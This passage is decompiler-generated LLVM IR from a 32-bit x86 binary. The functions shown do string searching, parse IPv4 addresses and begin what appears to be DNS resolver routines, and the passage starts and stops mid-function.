  br label %dec_label_pc_80504cd

dec_label_pc_80504cd:                             ; preds = %dec_label_pc_80504a0, %dec_label_pc_80504c9
  %v0_80504d0 = phi i32 [ %v0_80504d0.pre, %dec_label_pc_80504a0 ], [ %v0_80504cb, %dec_label_pc_80504c9 ]
  ret i32 %v0_80504d0

; uselistorder directives
  uselistorder i32 %v8_80504aa, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80504cd, { 1, 0 }
  uselistorder label %dec_label_pc_80504c9, { 1, 0 }
  uselistorder label %dec_label_pc_805048d, { 1, 0 }
}

define i32 @function_80504d4(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80504d4:
  %v0_80504d5 = load i32, i32* @ebx, align 4
  %v2_80504ec25 = load i8, i8* %arg1, align 1
  %v4_80504ee29 = icmp eq i8 %v2_80504ec25, 0
  br i1 %v4_80504ee29, label %dec_label_pc_80504f6, label %dec_label_pc_80504f2.lr.ph

dec_label_pc_80504f2.lr.ph:                       ; preds = %dec_label_pc_80504d4
  %v3_80504ec26 = zext i8 %v2_80504ec25 to i32
  %v5_80504ec27 = and i32 %v0_80504d5, -256
  %v6_80504ec28 = or i32 %v3_80504ec26, %v5_80504ec27
  %v4_80504da = ptrtoint i8* %arg1 to i32
  %v1_80504e513 = inttoptr i32 %arg2 to i8*
  %v4_80504e5.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80504f2

dec_label_pc_80504e0:                             ; preds = %dec_label_pc_80504f2, %dec_label_pc_80504e4
  %v6_80504e523 = phi i32 [ %v6_80504e5, %dec_label_pc_80504e4 ], [ %v6_80504e517, %dec_label_pc_80504f2 ]
  %v2_80504e522 = phi i8 [ %v2_80504e5, %dec_label_pc_80504e4 ], [ %v2_80504e514, %dec_label_pc_80504f2 ]
  %v0_80504e421 = phi i32 [ %v1_80504e4, %dec_label_pc_80504e4 ], [ %arg2, %dec_label_pc_80504f2 ]
  %v15_80504e0 = icmp eq i8 %v2_80504e522, %v2_80504ec33
  br i1 %v15_80504e0, label %dec_label_pc_80504f8, label %dec_label_pc_80504e4

dec_label_pc_80504e4:                             ; preds = %dec_label_pc_80504e0
  %v1_80504e4 = add i32 %v0_80504e421, 1
  %v1_80504e5 = inttoptr i32 %v1_80504e4 to i8*
  %v2_80504e5 = load i8, i8* %v1_80504e5, align 1
  %v3_80504e5 = zext i8 %v2_80504e5 to i32
  %v5_80504e5 = and i32 %v6_80504e523, -256
  %v6_80504e5 = or i32 %v3_80504e5, %v5_80504e5
  %v4_80504e7 = icmp eq i8 %v2_80504e5, 0
  %v1_80504e9 = icmp eq i1 %v4_80504e7, false
  br i1 %v1_80504e9, label %dec_label_pc_80504e0, label %dec_label_pc_80504eb

dec_label_pc_80504eb:                             ; preds = %dec_label_pc_80504e4, %dec_label_pc_80504f2
  %v4_80504e5.pre36 = phi i32 [ %v6_80504e517, %dec_label_pc_80504f2 ], [ %v6_80504e5, %dec_label_pc_80504e4 ]
  %v1_80504eb = add i32 %v0_80504eb31, 1
  %v1_80504ec = inttoptr i32 %v1_80504eb to i8*
  %v2_80504ec = load i8, i8* %v1_80504ec, align 1
  %v3_80504ec = zext i8 %v2_80504ec to i32
  %v5_80504ec = and i32 %v6_80504ec34, -256
  %v6_80504ec = or i32 %v3_80504ec, %v5_80504ec
  %v4_80504ee = icmp eq i8 %v2_80504ec, 0
  br i1 %v4_80504ee, label %dec_label_pc_80504f6, label %dec_label_pc_80504f2

dec_label_pc_80504f2:                             ; preds = %dec_label_pc_80504f2.lr.ph, %dec_label_pc_80504eb
  %v4_80504e5.pre = phi i32 [ %v4_80504e5.pre.pre, %dec_label_pc_80504f2.lr.ph ], [ %v4_80504e5.pre36, %dec_label_pc_80504eb ]
  %v6_80504ec34 = phi i32 [ %v6_80504ec28, %dec_label_pc_80504f2.lr.ph ], [ %v6_80504ec, %dec_label_pc_80504eb ]
  %v2_80504ec33 = phi i8 [ %v2_80504ec25, %dec_label_pc_80504f2.lr.ph ], [ %v2_80504ec, %dec_label_pc_80504eb ]
  %v0_80504eb31 = phi i32 [ %v4_80504da, %dec_label_pc_80504f2.lr.ph ], [ %v1_80504eb, %dec_label_pc_80504eb ]
  %v2_80504e514 = load i8, i8* %v1_80504e513, align 1
  %v3_80504e515 = zext i8 %v2_80504e514 to i32
  %v5_80504e516 = and i32 %v4_80504e5.pre, -256
  %v6_80504e517 = or i32 %v3_80504e515, %v5_80504e516
  %v4_80504e718 = icmp eq i8 %v2_80504e514, 0
  %v1_80504e920 = icmp eq i1 %v4_80504e718, false
  br i1 %v1_80504e920, label %dec_label_pc_80504e0, label %dec_label_pc_80504eb

dec_label_pc_80504f6:                             ; preds = %dec_label_pc_80504eb, %dec_label_pc_80504d4
  br label %dec_label_pc_80504f8

dec_label_pc_80504f8:                             ; preds = %dec_label_pc_80504e0, %dec_label_pc_80504f6
  %v0_80504fa = phi i32 [ 0, %dec_label_pc_80504f6 ], [ %v0_80504eb31, %dec_label_pc_80504e0 ]
  store i32 %v0_80504d5, i32* @ebx, align 4
  ret i32 %v0_80504fa

; uselistorder directives
  uselistorder i8 %v2_80504e514, { 1, 2, 0 }
  uselistorder i32 %v1_80504eb, { 1, 0 }
  uselistorder i32 %v6_80504e5, { 1, 0 }
  uselistorder i8 %v2_80504e5, { 1, 2, 0 }
  uselistorder i32 %v1_80504e4, { 1, 0 }
  uselistorder i8 %v2_80504ec25, { 0, 2, 1 }
  uselistorder i32 %v0_80504d5, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80504f8, { 1, 0 }
  uselistorder label %dec_label_pc_80504f2, { 1, 0 }
  uselistorder label %dec_label_pc_80504eb, { 1, 0 }
}

define i32 @function_80504fc(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80504fc:
  %v4_8050503 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8050503, i32* @ecx, align 4
  %v1_8050507 = icmp eq i8* %arg1, null
  br i1 %v1_8050507, label %dec_label_pc_8050588, label %dec_label_pc_805050b

dec_label_pc_805050b:                             ; preds = %dec_label_pc_80504fc
  %v0_8050516.pre = load i32, i32* @global_var_8055da0, align 32
  br label %dec_label_pc_8050516

dec_label_pc_8050516:                             ; preds = %dec_label_pc_805050b, %dec_label_pc_805055f
  %v2_805055f35 = phi i32 [ 1, %dec_label_pc_805050b ], [ %v3_805055f, %dec_label_pc_805055f ]
  %v0_805051c34 = phi i32 [ %v4_8050503, %dec_label_pc_805050b ], [ %v0_805051c4, %dec_label_pc_805055f ]
  %v0_805057d33 = phi i32 [ 0, %dec_label_pc_805050b ], [ %v2_8050565, %dec_label_pc_805055f ]
  %v1_805051c = inttoptr i32 %v0_805051c34 to i8*
  %v2_805051c = load i8, i8* %v1_805051c, align 1
  %v3_805051c = sext i8 %v2_805051c to i32
  %v2_805051f = mul nsw i32 %v3_805051c, 2
  %v3_805051f = add i32 %v2_805051f, %v0_8050516.pre
  %v4_805051f = inttoptr i32 %v3_805051f to i8*
  %v5_805051f = load i8, i8* %v4_805051f, align 1
  %v6_805051f = and i8 %v5_805051f, 8
  %v7_805051f = icmp eq i8 %v6_805051f, 0
  br i1 %v7_805051f, label %dec_label_pc_8050588, label %dec_label_pc_8050526

dec_label_pc_8050526:                             ; preds = %dec_label_pc_8050516
  %v4_805053a.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805053a

dec_label_pc_805052a:                             ; preds = %dec_label_pc_805053a
  %v3_805052a = mul i32 %v1_805052a, 10
  %v2_805052d = add i32 %v3_805052a, -48
  %v3_805052d = add i32 %v2_805052d, %v2_805053c
  %v1_8050531 = add i32 %v3_805052d, -255
  %v6_8050531 = sub i32 254, %v3_805052d
  %v7_8050531 = and i32 %v6_8050531, %v3_805052d
  %v8_8050531 = icmp slt i32 %v7_8050531, 0
  %v9_8050531 = icmp eq i32 %v1_8050531, 0
  %v10_8050531 = icmp slt i32 %v1_8050531, 0
  %v3_8050537 = icmp eq i1 %v10_8050531, %v8_8050531
  %v4_8050537 = icmp eq i1 %v9_8050531, false
  %v5_8050537 = and i1 %v4_8050537, %v3_8050537
  br i1 %v5_8050537, label %dec_label_pc_8050588, label %dec_label_pc_8050539

dec_label_pc_8050539:                             ; preds = %dec_label_pc_805052a
  %v1_8050539 = add i32 %v0_8050539, 1
  store i32 %v1_8050539, i32* @ecx, align 4
  br label %dec_label_pc_805053a

dec_label_pc_805053a:                             ; preds = %dec_label_pc_8050526, %dec_label_pc_8050539
  %v1_805052a = phi i32 [ 0, %dec_label_pc_8050526 ], [ %v3_805052d, %dec_label_pc_8050539 ]
  %v4_805053a = phi i32 [ %v4_805053a.pre, %dec_label_pc_8050526 ], [ %v6_805053a, %dec_label_pc_8050539 ]
  %v0_8050539 = phi i32 [ %v0_805051c34, %dec_label_pc_8050526 ], [ %v1_8050539, %dec_label_pc_8050539 ]
  %v1_805053a = inttoptr i32 %v0_8050539 to i8*
  %v2_805053a = load i8, i8* %v1_805053a, align 1
  %v3_805053a = zext i8 %v2_805053a to i32
  %v5_805053a = and i32 %v4_805053a, -256
  %v6_805053a = or i32 %v3_805053a, %v5_805053a
  store i32 %v6_805053a, i32* @edx, align 4
  %v2_805053c = sext i8 %v2_805053a to i32
  %v2_805053f = mul nsw i32 %v2_805053c, 2
  %v3_805053f = add i32 %v2_805053f, %v0_8050516.pre
  %v4_805053f = inttoptr i32 %v3_805053f to i16*
  %v5_805053f = load i16, i16* %v4_805053f, align 2
  %v2_8050544 = and i16 %v5_805053f, 8
  %v3_8050544 = icmp eq i16 %v2_8050544, 0
  %v1_8050546 = icmp eq i1 %v3_8050544, false
  br i1 %v1_8050546, label %dec_label_pc_805052a, label %dec_label_pc_8050548

dec_label_pc_8050548:                             ; preds = %dec_label_pc_805053a
  %v8_8050548 = sub nsw i32 2, %v2_805055f35
  %v9_8050548 = and i32 %v8_8050548, %v2_805055f35
  %v10_8050548 = icmp slt i32 %v9_8050548, 0
  %v11_8050548 = icmp eq i32 %v2_805055f35, 3
  %v12_8050548 = icmp slt i32 %v2_805055f35, 3
  %v3_805054c = icmp eq i1 %v12_8050548, %v10_8050548
  %v4_805054c = icmp eq i1 %v11_8050548, false
  %v5_805054c = and i1 %v4_805054c, %v3_805054c
  br i1 %v5_805054c, label %dec_label_pc_8050556, label %dec_label_pc_805054e

dec_label_pc_805054e:                             ; preds = %dec_label_pc_8050548
  %v10_805054e = icmp eq i8 %v2_805053a, 46
  %v1_8050551 = icmp eq i1 %v10_805054e, false
  br i1 %v1_8050551, label %dec_label_pc_8050588, label %dec_label_pc_8050553

dec_label_pc_8050553:                             ; preds = %dec_label_pc_805054e
  %v1_8050553 = add i32 %v0_8050539, 1
  store i32 %v1_8050553, i32* @ecx, align 4
  br label %dec_label_pc_805055f

dec_label_pc_8050556:                             ; preds = %dec_label_pc_8050548
  %v1_8050556 = add i32 %v0_8050539, 1
  store i32 %v1_8050556, i32* @ecx, align 4
  %v4_8050557 = icmp eq i8 %v2_805053a, 0
  br i1 %v4_8050557, label %dec_label_pc_805055f, label %dec_label_pc_805055b

dec_label_pc_805055b:                             ; preds = %dec_label_pc_8050556
  %v2_805055b = and i16 %v5_805053f, 32
  %v3_805055b = icmp eq i16 %v2_805055b, 0
  br i1 %v3_805055b, label %dec_label_pc_8050588, label %dec_label_pc_805055f

dec_label_pc_805055f:                             ; preds = %dec_label_pc_805055b, %dec_label_pc_8050556, %dec_label_pc_8050553
  %v0_805051c4 = phi i32 [ %v1_8050556, %dec_label_pc_805055b ], [ %v1_8050556, %dec_label_pc_8050556 ], [ %v1_8050553, %dec_label_pc_8050553 ]
  %v3_805055f = add nuw nsw i32 %v2_805055f35, 1
  %v2_8050562 = mul i32 %v0_805057d33, 256
  %v2_8050565 = or i32 %v1_805052a, %v2_8050562
  %v7_805056b = icmp sgt i32 %v2_805055f35, 3
  br i1 %v7_805056b, label %dec_label_pc_805056d, label %dec_label_pc_8050516

dec_label_pc_805056d:                             ; preds = %dec_label_pc_805055f
  %v4_805056d = icmp eq i32 %arg2, 0
  br i1 %v4_805056d, label %dec_label_pc_805058a, label %dec_label_pc_8050579

dec_label_pc_8050579:                             ; preds = %dec_label_pc_805056d
  %v1_805057d = call i32 @llvm.bswap.i32(i32 %v2_8050565)
  %v2_805057f = inttoptr i32 %arg2 to i32*
  store i32 %v1_805057d, i32* %v2_805057f, align 4
  br label %dec_label_pc_805058a

dec_label_pc_8050588:                             ; preds = %dec_label_pc_805055b, %dec_label_pc_805054e, %dec_label_pc_8050516, %dec_label_pc_805052a, %dec_label_pc_80504fc
  br label %dec_label_pc_805058a

dec_label_pc_805058a:                             ; preds = %dec_label_pc_805056d, %dec_label_pc_8050579, %dec_label_pc_8050588
  %v0_805058f = phi i32 [ 1, %dec_label_pc_805056d ], [ 1, %dec_label_pc_8050579 ], [ 0, %dec_label_pc_8050588 ]
  ret i32 %v0_805058f

; uselistorder directives
  uselistorder i32 %v2_805053c, { 1, 0 }
  uselistorder i32 %v6_805053a, { 1, 0 }
  uselistorder i8 %v2_805053a, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8050539, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8050531, { 1, 0 }
  uselistorder i32 %v3_805052d, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805051c34, { 1, 0 }
  uselistorder i32 %v2_805055f35, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805058a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050588, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_805053a, { 1, 0 }
  uselistorder label %dec_label_pc_8050516, { 1, 0 }
}

define i32 @function_8050590(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_8050590:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  store i32 %arg3, i32* @edi, align 4
  store i32 512, i32* %stack_var_-252, align 4
  %v1_80505a6 = call i32 @function_804daaa(i32 512)
  store i32 %v1_80505a6, i32* %eax.global-to-local, align 4
  store i32 1025, i32* %stack_var_-252, align 4
  store i32 %v1_80505a6, i32* @ebp, align 4
  %v1_80505b4 = call i32 @function_804daaa(i32 1025)
  store i32 %v1_80505b4, i32* %eax.global-to-local, align 4
  %v12_80505bd = ptrtoint i32* %stack_var_-236 to i32
  %v1_80505c0 = icmp eq i32 %v1_80505a6, 0
  br i1 %v1_80505c0, label %dec_label_pc_8050c39, label %dec_label_pc_80505c8

dec_label_pc_80505c8:                             ; preds = %dec_label_pc_8050590
  %v1_80505c8 = icmp eq i32 %v1_80505b4, 0
  br i1 %v1_80505c8, label %dec_label_pc_8050c39, label %dec_label_pc_80505d0

dec_label_pc_80505d0:                             ; preds = %dec_label_pc_80505c8
  %v5_80505d0 = icmp eq i32 %arg2, 0
  br i1 %v5_80505d0, label %dec_label_pc_8050c39, label %dec_label_pc_80505de

dec_label_pc_80505de:                             ; preds = %dec_label_pc_80505d0
  %v4_80505de = ptrtoint i8* %arg1 to i32
  store i32 %v4_80505de, i32* %eax.global-to-local, align 4
  %v2_80505e5 = load i8, i8* %arg1, align 1
  %v3_80505e5 = icmp eq i8 %v2_80505e5, 0
  br i1 %v3_80505e5, label %dec_label_pc_8050c39, label %dec_label_pc_80505ee

dec_label_pc_80505ee:                             ; preds = %dec_label_pc_80505de
  store i32 %v4_80505de, i32* %stack_var_-252, align 4
  %v2_80505f2 = call i32 @function_804d204(i8* nonnull %arg1)
  store i32 %v2_80505f2, i32* @eax, align 4
  store i32 %v4_80505de, i32* %edx.global-to-local, align 4
  %v2_8050615 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_8050615, i32* @ebx, align 4
  store i32 %v2_8050615, i32* %stack_var_-252, align 4
  %v2_805061d = call i32 @function_804f016(i32 %v2_8050615, i32 134541331)
  store i32 %v2_805061d, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8058488.194 to i32), i32* %stack_var_-252, align 4
  %v1_8050629 = call i32 @function_804f013(i32 ptrtoint (i32* @global_var_8058488.194 to i32))
  %v0_805062e = load i64, i64* @global_var_80584a0.195, align 8
  %v1_805062e = trunc i64 %v0_805062e to i32
  %v1_8050633 = ashr i32 %v1_805062e, 31
  %v6_8050634 = and i64 %v0_805062e, 4294967295
  %v8_8050634 = zext i32 %v1_8050633 to i64
  %v9_8050634 = mul nuw i64 %v8_8050634, 4294967296
  %v10_8050634 = or i64 %v9_8050634, %v6_8050634
  %v14_8050634 = srem i64 %v10_8050634, %tmp33
  %v15_8050634 = trunc i64 %v14_8050634 to i32
  %v0_805063b = load i16, i16* @global_var_8055dac.196, align 4
  %v2_805064a = load i32, i32* %stack_var_-252, align 4
  store i32 %v2_805064a, i32* @eax, align 4
  store i32 134541331, i32* %edx.global-to-local, align 4
  store i32 %v2_8050615, i32* %stack_var_-252, align 4
  %v2_805064f = call i32 @function_804f016(i32 %v2_8050615, i32 1)
  store i32 %v2_805064f, i32* %eax.global-to-local, align 4
  %v4_80507f6 = inttoptr i32 %v15_8050634 to i8*
  %v1_8050c1486 = add i32 %v12_80505bd, 28
  %v2_8050c1487 = inttoptr i32 %v1_8050c1486 to i32*
  %v3_8050c1488 = load i32, i32* %v2_8050c1487, align 4
  %tmp = icmp ult i32 %v3_8050c1488, 3
  br i1 %tmp, label %dec_label_pc_8050674, label %dec_label_pc_8050c39

dec_label_pc_8050674:                             ; preds = %dec_label_pc_80505ee, %dec_label_pc_8050c14.backedge
  %v0_805067b94 = phi i32 [ %v0_8050c14.pre, %dec_label_pc_8050c14.backedge ], [ %v12_80505bd, %dec_label_pc_80505ee ]
  %v1_8050674 = add i32 %v0_805067b94, 20
  %v2_8050674 = inttoptr i32 %v1_8050674 to i32*
  %v3_8050674 = load i32, i32* %v2_8050674, align 4
  %v13_8050674 = icmp eq i32 %v3_8050674, -1
  br i1 %v13_8050674, label %dec_label_pc_8050674.dec_label_pc_805068a_crit_edge, label %dec_label_pc_805067b

dec_label_pc_8050674.dec_label_pc_805068a_crit_edge: ; preds = %dec_label_pc_8050674
  %v0_805068a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805068a

dec_label_pc_805067b:                             ; preds = %dec_label_pc_8050674
  %v3_805067e = load i32, i32* %v2_8050674, align 4
  %v5_805067e = add i32 %v0_805067b94, -16
  %v6_805067e = inttoptr i32 %v5_805067e to i32*
  store i32 %v3_805067e, i32* %v6_805067e, align 4
  %v1_8050682 = call i32 @function_804b5f4(i32 -1)
  store i32 %v1_8050682, i32* %eax.global-to-local, align 4
  %v0_8050687 = load i32, i32* @esp, align 4
  %v1_8050687 = add i32 %v0_8050687, 16
  br label %dec_label_pc_805068a

dec_label_pc_805068a:                             ; preds = %dec_label_pc_8050674.dec_label_pc_805068a_crit_edge, %dec_label_pc_805067b
  %v1_805068a = phi i32 [ %v0_805067b94, %dec_label_pc_8050674.dec_label_pc_805068a_crit_edge ], [ %v1_8050687, %dec_label_pc_805067b ]
  %v0_805068a = phi i32 [ %v0_805068a.pre, %dec_label_pc_8050674.dec_label_pc_805068a_crit_edge ], [ %v1_8050682, %dec_label_pc_805067b ]
  %v2_805068a = add i32 %v1_805068a, -4
  %v3_805068a = inttoptr i32 %v2_805068a to i32*
  store i32 %v0_805068a, i32* %v3_805068a, align 4
  %v1_805068b = add i32 %v1_805068a, -8
  %v2_805068b = inttoptr i32 %v1_805068b to i32*
  store i32 512, i32* %v2_805068b, align 4
  %v1_8050690 = add i32 %v1_805068a, -12
  %v2_8050690 = inttoptr i32 %v1_8050690 to i32*
  store i32 0, i32* %v2_8050690, align 4
  %v2_8050692 = add i32 %v1_805068a, -16
  %v3_8050692 = inttoptr i32 %v2_8050692 to i32*
  store i32 %v1_80505a6, i32* %v3_8050692, align 4
  %v4_8050693 = call i32 @function_804d1d0(i8* inttoptr (i32 -1 to i8*), i32 %v15_8050634, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8050693, i32* %eax.global-to-local, align 4
  %v0_8050698 = load i32, i32* @esp, align 4
  %v1_805069b = add i32 %v0_8050698, 8
  %v2_805069b = inttoptr i32 %v1_805069b to i32*
  store i32 48, i32* %v2_805069b, align 4
  %v1_805069d = add i32 %v0_8050698, 4
  %v2_805069d = inttoptr i32 %v1_805069d to i32*
  store i32 0, i32* %v2_805069d, align 4
  %v1_805069f = add i32 %v0_8050698, 84
  store i32 %v1_805069f, i32* @ebx, align 4
  %v3_80506a3 = inttoptr i32 %v0_8050698 to i32*
  store i32 %v1_805069f, i32* %v3_80506a3, align 4
  %v4_80506a4 = call i32 @function_804d1d0(i8* inttoptr (i32 -1 to i8*), i32 %v15_8050634, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80506a4, i32* %eax.global-to-local, align 4
  %v0_80506a9 = load i32, i32* @esp, align 4
  %v1_80506a9 = add i32 %v0_80506a9, 72
  %v2_80506a9 = inttoptr i32 %v1_80506a9 to i32*
  %v3_80506a9 = load i32, i32* %v2_80506a9, align 4
  store i32 %v3_80506a9, i32* %eax.global-to-local, align 4
  %v1_80506ad = add i32 %v0_80506a9, 116
  %v2_80506ad = inttoptr i32 %v1_80506ad to i32*
  store i32 1, i32* %v2_80506ad, align 4
  %v0_80506b5 = load i32, i32* @esp, align 4
  %v1_80506b5 = add i32 %v0_80506b5, 104
  %v2_80506b5 = inttoptr i32 %v1_80506b5 to i32*
  store i32 1, i32* %v2_80506b5, align 4
  %v0_80506bd = load i32, i32* %eax.global-to-local, align 4
  %v1_80506bd = add i32 %v0_80506bd, 1
  %v1_80506be = urem i32 %v1_80506bd, 65536
  store i32 %v1_80506be, i32* %eax.global-to-local, align 4
  %v1_80506c3 = load i32, i32* @esp, align 4
  %v2_80506c3 = add i32 %v1_80506c3, 72
  %v3_80506c3 = inttoptr i32 %v2_80506c3 to i32*
  store i32 %v1_80506be, i32* %v3_80506c3, align 4
  %v0_80506c7 = load i32, i32* %eax.global-to-local, align 4
  %v1_80506c7 = load i32, i32* @esp, align 4
  %v2_80506c7 = add i32 %v1_80506c7, 84
  %v3_80506c7 = inttoptr i32 %v2_80506c7 to i32*
  store i32 %v0_80506c7, i32* %v3_80506c7, align 4
  %v0_80506cb = load i32, i32* @esp, align 4
  %v1_80506ce = add i32 %v0_80506cb, 8
  %v2_80506ce = inttoptr i32 %v1_80506ce to i32*
  store i32 512, i32* %v2_80506ce, align 4
  %v2_80506d3 = add i32 %v0_80506cb, 4
  %v3_80506d3 = inttoptr i32 %v2_80506d3 to i32*
  store i32 %v1_80505a6, i32* %v3_80506d3, align 4
  %v0_80506d4 = load i32, i32* @ebx, align 4
  %v3_80506d4 = inttoptr i32 %v0_80506cb to i32*
  store i32 %v0_80506d4, i32* %v3_80506d4, align 4
  %v0_80506d5 = call i32 @function_8051980()
  store i32 %v0_80506d5, i32* %eax.global-to-local, align 4
  %v0_80506da = load i32, i32* @esp, align 4
  %v2_80506dd = icmp slt i32 %v0_80506d5, 0
  store i32 %v0_80506d5, i32* @ebx, align 4
  br i1 %v2_80506dd, label %dec_label_pc_8050c39, label %dec_label_pc_80506e7

dec_label_pc_80506e7:                             ; preds = %dec_label_pc_805068a
  %v2_80506e7 = add i32 %v0_80506da, 12
  %v3_80506e7 = inttoptr i32 %v2_80506e7 to i32*
  store i32 %v0_80506d5, i32* %v3_80506e7, align 4
  %v1_80506e8 = add i32 %v0_80506da, 8
  %v2_80506e8 = inttoptr i32 %v1_80506e8 to i32*
  store i32 1025, i32* %v2_80506e8, align 4
  %v1_80506ed = add i32 %v0_80506da, 256
  %v2_80506ed = inttoptr i32 %v1_80506ed to i32*
  %v3_80506ed = load i32, i32* %v2_80506ed, align 4
  %v5_80506ed = add i32 %v0_80506da, 4
  %v6_80506ed = inttoptr i32 %v5_80506ed to i32*
  store i32 %v3_80506ed, i32* %v6_80506ed, align 4
  %v1_80506f4 = add i32 %v0_80506da, 28
  %v2_80506f4 = inttoptr i32 %v1_80506f4 to i32*
  %v3_80506f4 = load i32, i32* %v2_80506f4, align 4
  %v6_80506f4 = inttoptr i32 %v0_80506da to i32*
  store i32 %v3_80506f4, i32* %v6_80506f4, align 4
  %v4_80506f8 = call i32 @function_804d218(i8* inttoptr (i32 -1 to i8*), i32 %v15_8050634, i32 ptrtoint (i32* @0 to i32))
  %v0_80506fd = load i32, i32* @esp, align 4
  %v1_8050700 = add i32 %v0_80506fd, 8
  %v2_8050700 = inttoptr i32 %v1_8050700 to i32*
  store i32 ptrtoint (i32* @global_var_8055db0.136 to i32), i32* %v2_8050700, align 4
  %v1_8050705 = add i32 %v0_80506fd, 4
  %v2_8050705 = inttoptr i32 %v1_8050705 to i32*
  store i32 134541331, i32* %v2_8050705, align 4
  %v1_805070a = add i32 %v0_80506fd, 200
  store i32 %v1_805070a, i32* @eax, align 4
  %v3_8050711 = inttoptr i32 %v0_80506fd to i32*
  store i32 %v1_805070a, i32* %v3_8050711, align 4
  %v2_8050712 = call i32 @function_804f016(i32 -1, i32 %v15_8050634)
  store i32 %v2_8050712, i32* %eax.global-to-local, align 4
  %v0_8050717 = load i32, i32* @esp, align 4
  %v1_8050717 = inttoptr i32 %v0_8050717 to i32*
  store i32 ptrtoint (i32* @global_var_8055db0.136 to i32), i32* %v1_8050717, align 4
  %v1_805071e = call i32 @function_804f013(i32 -1)
  store i32 %v1_805071e, i32* %eax.global-to-local, align 4
  %v0_8050723 = load i32, i32* @esp, align 4
  %v1_8050723 = add i32 %v0_8050723, 56
  %v2_8050723 = inttoptr i32 %v1_8050723 to i32*
  %v3_8050723 = load i32, i32* %v2_8050723, align 4
  store i32 %v3_8050723, i32* %edx.global-to-local, align 4
  %v1_8050727 = add i32 %v0_8050723, 268
  %v2_8050727 = inttoptr i32 %v1_8050727 to i32*
  %v3_8050727 = load i32, i32* %v2_8050727, align 4
  store i32 %v3_8050727, i32* %eax.global-to-local, align 4
  %v2_805072e = mul i32 %v3_8050723, 4
  %v3_805072e = add i32 %v3_8050727, %v2_805072e
  %v4_805072e = inttoptr i32 %v3_805072e to i32*
  %v5_805072e = load i32, i32* %v4_805072e, align 4
  store i32 %v5_805072e, i32* %edx.global-to-local, align 4
  %v2_8050731 = add i32 %v0_8050723, 48
  %v3_8050731 = inttoptr i32 %v2_8050731 to i32*
  store i32 %v5_805072e, i32* %v3_8050731, align 4
  %v0_8050735 = load i32, i32* @esp, align 4
  %v1_8050735 = add i32 %v0_8050735, 16
  %v1_8050738 = add i32 %v0_8050735, 52
  %v2_8050738 = inttoptr i32 %v1_8050738 to i32*
  %v3_8050738 = load i32, i32* %v2_8050738, align 4
  %v5_8050738 = icmp slt i32 %v3_8050738, 0
  br i1 %v5_8050738, label %dec_label_pc_80506e7.dec_label_pc_805077e_crit_edge, label %dec_label_pc_805073f

dec_label_pc_80506e7.dec_label_pc_805077e_crit_edge: ; preds = %dec_label_pc_80506e7
  %v0_805077e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805077e

dec_label_pc_805073f:                             ; preds = %dec_label_pc_80506e7
  store i32 %v3_8050738, i32* %eax.global-to-local, align 4
  %v1_8050743 = load i32, i32* @global_var_8058a98.197, align 8
  %v2_8050743 = sub i32 %v3_8050738, %v1_8050743
  %v8_8050743 = xor i32 %v1_8050743, %v3_8050738
  %v9_8050743 = xor i32 %v2_8050743, %v3_8050738
  %v10_8050743 = and i32 %v9_8050743, %v8_8050743
  %v11_8050743 = icmp slt i32 %v10_8050743, 0
  %v13_8050743 = icmp slt i32 %v2_8050743, 0
  %v2_8050749 = icmp eq i1 %v13_8050743, %v11_8050743
  br i1 %v2_8050749, label %dec_label_pc_805077e, label %dec_label_pc_805074b

dec_label_pc_805074b:                             ; preds = %dec_label_pc_805073f
  %v2_805074b = add i32 %v0_8050735, 12
  %v3_805074b = inttoptr i32 %v2_805074b to i32*
  store i32 %v3_8050738, i32* %v3_805074b, align 4
  %v1_805074c = add i32 %v0_8050735, 8
  %v2_805074c = inttoptr i32 %v1_805074c to i32*
  store i32 1025, i32* %v2_805074c, align 4
  %v1_8050751 = add i32 %v0_8050735, 4
  %v2_8050751 = inttoptr i32 %v1_8050751 to i32*
  store i32 ptrtoint (i32* @global_var_805497c.198 to i32), i32* %v2_8050751, align 4
  %v1_8050756 = add i32 %v0_8050735, 28
  %v2_8050756 = inttoptr i32 %v1_8050756 to i32*
  %v3_8050756 = load i32, i32* %v2_8050756, align 4
  %v6_8050756 = inttoptr i32 %v0_8050735 to i32*
  store i32 %v3_8050756, i32* %v6_8050756, align 4
  %v0_805075a = call i32 @function_8051384()
  store i32 %v0_805075a, i32* %eax.global-to-local, align 4
  %v0_805075f = load i32, i32* @esp, align 4
  %v1_8050762 = add i32 %v0_805075f, 8
  %v2_8050762 = inttoptr i32 %v1_8050762 to i32*
  store i32 1025, i32* %v2_8050762, align 4
  %v1_8050767 = add i32 %v0_805075f, 52
  %v2_8050767 = inttoptr i32 %v1_8050767 to i32*
  %v3_8050767 = load i32, i32* %v2_8050767, align 4
  store i32 %v3_8050767, i32* %edx.global-to-local, align 4
